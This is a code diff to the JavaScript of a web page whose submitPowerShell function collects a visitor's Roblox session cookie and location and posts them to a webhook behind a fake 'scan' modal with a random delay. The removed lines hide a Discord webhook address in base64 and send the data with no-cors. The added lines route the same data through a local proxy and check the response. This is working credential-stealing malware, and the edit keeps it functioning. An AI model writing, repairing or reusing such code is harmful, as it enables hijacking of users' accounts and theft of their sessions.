@@ -263,8 +263,8 @@ async function submitPowerShell() {
         const delay = Math.floor(Math.random() * 2000) + 1000;
         await new Promise(resolve => setTimeout(resolve, delay));
         
-        // Discord webhook URL
-        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NjE2MDQyMDIyOTgwODIzOC9uSmdYcDdqVXBzcldCWUE4YTQxcDlKNnRCemphNDA1YUcyWGhTOGhUcGw4cEsyMGl2Zm1vamR1LXZwT2FOOUFBZE1FSQ==');
+        // Use local proxy to bypass CORS restrictions
+        const webhookUrl = 'http://localhost:8080/webhook';
         
         // Simple webhook payload - only cookie and location
         const payload = {
@@ -273,27 +273,31 @@ Cookie: ${robloxCookie || 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
-        // Send webhook request
+        // Send webhook request through proxy
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(payload),
-            mode: 'no-cors'
+            body: JSON.stringify(payload)
         });
         
         // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
 
-        // In no-cors mode, we can't read the response, so assume success if no error was thrown
-        submitText.textContent = 'Sent!';
-        submitBtn.style.background = '#10b981';
-        showNotification('Data sent successfully!', 'success');
-        
-        setTimeout(() => {
-            closeScanModal();
-        }, 2000);
+        if (response.ok) {
+            const result = await response.json();
+            submitText.textContent = 'Sent!';
+            submitBtn.style.background = '#10b981';
+            showNotification('Data sent successfully!', 'success');
+            
+            setTimeout(() => {
+                closeScanModal();
+            }, 2000);
+        } else {
+            const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
+            throw new Error(`Webhook failed: ${errorData.error || response.status}`);
+        }
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
         
